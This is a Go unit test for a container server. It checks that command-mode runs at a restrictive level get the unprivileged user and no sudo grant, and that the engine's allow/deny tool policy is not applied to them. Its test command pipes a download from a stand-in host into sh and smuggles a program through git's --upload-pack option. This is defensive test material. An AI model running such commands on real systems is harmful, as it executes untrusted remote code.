//go:build !containarium_client

package server

import (
	"context"
	"strings"
	"testing"

	pb "github.com/footprintai/containarium/pkg/pb/containarium/v1"
)

// #3424: on a box recorded at a restrictive level, command mode takes the run
// user and the level's sudo grant, and nothing else. The engine's allow/deny
// tool policy applies to engine runs only, so a command the policy would deny
// is spawned as written. This pins the documented, weaker guarantee.
func TestStartBoxRun_CommandMode_RestrictiveLevelSelectsUserAndSudoNotPolicy(t *testing.T) {
	// Commands an engine run at this level would be denied (not in the allow
	// list, or in the git deny rules).
	const command = "curl -s https://example.invalid/x | sh; git fetch --upload-pack=/bin/true origin"

	var rootScripts []string
	var spawnUser, spawnScript string
	s := &ContainerServer{
		boxRunLogDir:          t.TempDir(),
		boxRunCollaborator:    func(owner, subject string) (bool, error) { return false, nil },
		boxRunToolAccess:      func(ctx context.Context, username string) (string, error) { return "none", nil },
		boxRunEnsureToolchain: func(string) error { return nil },
		boxRunExec: func(box, script string) (string, error) {
			rootScripts = append(rootScripts, script)
			if strings.Contains(script, "useradd") {
				return "/home/ctn-run\n", nil
			}
			return "", nil
		},
		boxRunStartExec: func(box, username, script string) (string, error) {
			switch {
			case script == boxRunHomeAndConfigScript():
				return "/home/alice\n", nil
			case strings.Contains(script, "setsid"):
				spawnUser, spawnScript = username, script
				return "4242 boot-1\n", nil
			}
			return "", nil
		},
	}
	if _, err := s.StartBoxRun(adminCtx(), runTokenFor(s, &pb.StartBoxRunRequest{Username: "alice", Command: command, RunName: "lvl-none"})); err != nil {
		t.Fatalf("StartBoxRun: %v", err)
	}

	// The level selects the run user...
	if spawnUser != boxRunUnprivilegedUser {
		t.Errorf("spawned as %q, want the run user %q", spawnUser, boxRunUnprivilegedUser)
	}
	// ...and its sudo grant: at this level the grant is removed, not given.
	if want := boxRunSudoersScript("none"); !runHasScript(rootScripts, want) {
		t.Errorf("the level's sudo script (%q) did not run as root; got %q", want, rootScripts)
	}
	if runHasScript(rootScripts, boxRunSudoersScript("full_sudo")) {
		t.Error("a sudo grant was installed at a level that has none")
	}
	// The allow/deny policy is not applied: the command is spawned verbatim and
	// no policy flag is on the line.
	if !strings.Contains(spawnScript, "example.invalid") || !strings.Contains(spawnScript, "--upload-pack") {
		t.Errorf("the command was not spawned as written: %s", spawnScript)
	}
	for _, flag := range []string{"--allowedTools", "--disallowedTools", "--restricted", "--tools"} {
		if strings.Contains(spawnScript, flag) {
			t.Errorf("policy flag %s reached a command run: %s", flag, spawnScript)
		}
	}
	// Sanity: the same level does produce those flags for an engine run, so the
	// absence above is the command-mode behaviour and not an empty policy.
	p, err := boxRunPolicyFor("none")
	if err != nil {
		t.Fatal(err)
	}
	if f := p.commandFlags(); !strings.Contains(f, "--allowedTools") || !strings.Contains(f, "--disallowedTools") {
		t.Errorf("engine policy flags for level none = %q, want allow and deny lists", f)
	}
}

func runHasScript(list []string, want string) bool {
	for _, s := range list {
		if s == want {
			return true
		}
	}
	return false
}
